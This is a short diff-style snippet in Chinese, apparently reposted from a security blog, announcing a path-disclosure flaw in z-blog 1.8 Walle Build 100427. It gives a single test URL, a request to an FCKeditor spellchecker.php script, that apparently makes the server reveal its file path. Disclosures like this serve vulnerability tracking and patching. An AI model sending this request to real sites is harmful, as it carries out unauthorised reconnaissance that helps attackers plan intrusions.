@@ -1,0 +1,3 @@
+z-blog 1.8 Walle Build 100427 爆路径漏洞
+测试代码：/admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php
+本文来源于独自等待博客：http://www.waitalone.cn/ 原文地址：http://www.waitalone.cn/post/586.html 
